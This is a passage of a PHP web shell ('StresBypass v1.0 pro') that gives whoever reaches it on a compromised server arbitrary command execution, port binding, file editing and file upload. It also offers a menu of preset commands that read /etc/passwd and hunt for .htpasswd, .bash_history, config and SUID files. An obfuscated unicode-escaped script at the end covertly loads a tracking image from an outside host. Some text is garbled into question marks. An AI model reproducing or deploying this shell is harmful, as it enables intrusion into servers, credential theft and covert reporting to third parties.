$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";

}

if (is_readable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";
}
$dires = $dires . $directory;
}

if (is_file($filename) == true){
$file = "";
$file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
$file = $file . "<td>Yes</td>";}
else{
$file = $file . "<td>No</td>";
}

if (is_readable($filename) == true){
$file = $file . "<td>Yes</td></td></tr>";}
else{
$file = $file . "<td>No</td></td></tr>";
}
$files = $files . $file;
}



}



}
echo $dires;
echo $files;
echo "</table><br>";




echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Emred:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">


Rehber:<INPUT type=\"text\" name=\"dir\" size=30 value=\"";

echo getcwd();
echo "\">
<INPUT type=\"submit\" value=\"..Exec..\"></form>";





if (ini_get('safe_mode') == 1){echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
Including from here: "
. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";}




?> </td></tr></table></p></td></tr></table></a><br><hr size="1" noshade><b></form></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2" bgcolor="#000000"><p align="center">
    <b>
    :: </b>
    <font face=Verdana size=-2><a href="?act=command">Uygulama Emreder</a></font><b> ::</b></p></td></tr><tr><td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000; border: 1px solid #000000"><center><b>
    <?
    echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
?>
        <input type="submit" name="submit1" value="Command" style="border: 1px solid #000000"><font face="Wingdings 3" color="#DCE7EF" size="3">f</font></form><p>
     </p>
    </td>
    <td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000"><center>
    <form action="?act=cmd" method="POST"><input type="hidden" name="act" value="cmd"><input type="hidden" name="d" value="c:/appserv/www/shells/">
        <font color="#DCE7EF">Select</font><font face="Wingdings 3" color="#DCE7EF" size="3">g</font><select name="cmd" size="1"><option value="ls -la">
        -----------------------------------------------------------</option>
        <option value="ls -la /var/lib/mysq">ls MySQL</option>
        <option value="which curl">cURL ?</option>
        <option value="which wget">Wget ?</option>
        <option value="which lynx">Lynx ?</option>
        <option value="which links">links ?</option>
        <option value="which fetch">fetch ?</option>
        <option value="which GET">GET ?</option>
        <option value="which per">Perl ?</option>
        <option value="gcc --help">C gcc Help ?</option>
        <option value="tar --help">tar Help ?</option>
        <option value="cat /etc/passwd">Get passwd !!!</option>
        <option value="cat /etc/hosts">Get hosts</option>
        <option value="perl --help">Perl Help ?</option>
        <option value="find / -type f -perm -04000 -ls">
        find all suid files</option><option value="find . -type f -perm -04000 -ls">
        find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">
        find all sgid files</option><option value="find . -type f -perm -02000 -ls">
        find sgid files in current dir</option><option value="find / -type f -name config.inc.php">
        find config.inc.php files</option><option value="find / -type f -name "config*"">
        find config* files</option><option value="find . -type f -name "config*"">
        find config* files in current dir</option><option value="find / -perm -2 -ls">
        find all writable directories and files</option><option value="find . -perm -2 -ls">
        find all writable directories and files in current dir</option><option value="find / -type f -name service.pwd">
        find all service.pwd files</option><option value="find . -type f -name service.pwd">
        find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">
        find all .htpasswd files</option><option value="find . -type f -name .htpasswd">
        find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">
        find all .bash_history files</option><option value="find . -type f -name .bash_history">
        find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">
        find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">
        find .fetchmailrc files in current dir</option><option value="lsattr -va">
        list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">
        show opened ports</option></select><input type="hidden" name="cmd_txt" value="1"> <input type="submit" name="submit" value="Execute" style="border: 1px solid #000000"></form></td></tr></TABLE><a bookmark="minipanel" href="?act=bind"><font face="Verdana" size="-2">Bind port to</font><font face="Webdings" size="5" color="#DCE7EF">?</font></a><font color="#00FF00"><br>
</font>
<a bookmark="minipanel">
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
<td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><form method="POST">
    <p align="center">
<a bookmark="minipanel">
    <b><font face="verdana" color="red" size="4">
    <a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel">
    <font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
    file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">"</font></p><p align="center">
     <?
if ($act == "edit") {echo "<center><b>??????? ????????:<br><br> ?? ???? ??? ????? ???? ???? ?????? ???<br>???? ???? ????? ??? config.php ????<br>Edit<br>????? ?? ????? ??? ??????? ????? <br>????? ? ??? ???? ????? ??? ??? ?? ???? ?? ???????? <br>???? ???? ???? ?????? washer-stres.txt   </a>.</b>";}
?>
    </p>
    <p> </p>
    <p>    <?
    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
Dosya Düzenle:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";
?>
    </p>
    </form></center></p></td>
<td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
                 <?
if ($act == "upload") {echo "<center><b>??? ???????:<br><br>?? ?????? ????? ?????? ???? <br>???? ???? ?? ?????? ??? ?????? ??????<br>UPLOAD< </a>.</b>";}
?><a bookmark="minipanel"><b><font size="2">::
    </font>
    </b><a href="?act=upload"><span lang="en-us"><font face="Verdana" size="2">
                    upload</font></span></a><b><font size="2">::</font></b><font face=Webdings size=2>N</font><font size="2"></a></a></font><br><form method="POST" ENCTYPE="multipart/form-data"><input type="hidden" name="miniform" value="1"><input type="hidden" name="act" value="upload"> 
        <?
        echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<INPUT type=\"file\" name=\"userfile\">
<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Download\"></form></div>";
?>
    <p></form></p></td>

</tr>
</table>    </a><p><br></p><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
    <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
    <b>
     </b><font face="Wingdings 3" size="5">y</font><b>StresBypass<span lang="en-us">v1.0</span> <span lang="en-us">pro</span>  </b><font color="#CC0000"><b>©oded by</b> </font><b><span lang="en-us"><a href="http://www.biyosecurity.com">BiyoSecurity.Com</a></span> |<span lang="en-us">By Stres</span> </b><font face="Wingdings 3" size="5">x</font></p><p align="center"> </p></td></tr></table>

</a>


<div align="right">

<span lang="en-us"> </span></div></body></html>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>